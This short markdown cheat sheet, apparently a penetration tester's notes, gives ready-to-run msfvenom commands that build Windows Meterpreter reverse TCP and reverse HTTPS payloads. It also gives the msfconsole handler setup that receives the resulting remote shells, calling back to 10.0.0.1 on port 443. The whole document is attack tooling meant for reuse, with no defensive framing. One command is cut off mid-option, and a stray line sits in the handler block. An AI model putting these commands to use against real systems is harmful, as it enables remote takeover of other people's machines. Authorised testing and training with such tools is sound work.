# Msfvenom

Examples of previously created MSFVenom payloads required in the different scenarios

##### Windows MeterpreterReverse TCP:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443 -b "\x00" -f exe -o shell.exe
```

##### Reverse HTTPS with proxy authentication:
```
msfvenom --platform Windows -p windows/meterpreter/reverse_https HttpProxyUser=* HttpProxyPass=* LHOST=10.0.0.1 LPORT=443 -b 
```

##### MSF Console:
```
msfconsole -q
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
windows/meterpreter/reverse_tcp
set lhost 10.0.0.1
set lport 443
exploit -j
```
